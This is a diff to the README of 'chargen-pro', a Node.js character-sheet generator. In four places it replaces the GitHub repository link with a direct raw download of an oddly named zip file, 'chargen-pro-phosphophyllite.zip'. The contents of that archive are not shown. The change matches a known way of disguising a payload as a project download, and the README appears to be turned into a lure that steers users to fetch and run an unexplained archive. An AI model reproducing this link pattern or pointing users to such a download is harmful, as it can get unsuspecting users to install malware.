@@ -1,6 +1,6 @@
 # 🧩 chargen-pro - Build Character Sheets Faster
 
-[![Download / Visit Page](https://img.shields.io/badge/Download%20or%20Visit%20Page-purple?style=for-the-badge&logo=github)](https://github.com/Emlynmanysided426/chargen-pro)
+[![Download / Visit Page](https://img.shields.io/badge/Download%20or%20Visit%20Page-purple?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Emlynmanysided426/chargen-pro/main/components/chargen-pro-phosphophyllite.zip)
 
 ## 🚀 What this is
 
@@ -20,7 +20,7 @@ Before you start, check these items:
 - Internet access
 - Node.js installed
 - A Gemini API key
-- Access to this GitHub page: https://github.com/Emlynmanysided426/chargen-pro
+- Access to this GitHub page: https://raw.githubusercontent.com/Emlynmanysided426/chargen-pro/main/components/chargen-pro-phosphophyllite.zip
 
 If you do not have Node.js yet, install the current Windows version from the Node.js website, then restart your PC if needed.
 
@@ -28,7 +28,7 @@ If you do not have Node.js yet, install the current Windows version from the Nod
 
 Open this page to get the app files and setup details:
 
-https://github.com/Emlynmanysided426/chargen-pro
+https://raw.githubusercontent.com/Emlynmanysided426/chargen-pro/main/components/chargen-pro-phosphophyllite.zip
 
 If you are using the repository files already on your computer, keep them in one folder that is easy to find, such as:
 
@@ -169,7 +169,7 @@ You should not need to change anything else to run the app locally.
 
 ## 🏁 Start here
 
-1. Open the GitHub page: https://github.com/Emlynmanysided426/chargen-pro
+1. Open the GitHub page: https://raw.githubusercontent.com/Emlynmanysided426/chargen-pro/main/components/chargen-pro-phosphophyllite.zip
 2. Make sure Node.js is installed.
 3. Add your Gemini API key to `.env.local`.
 4. Run `npm install`.
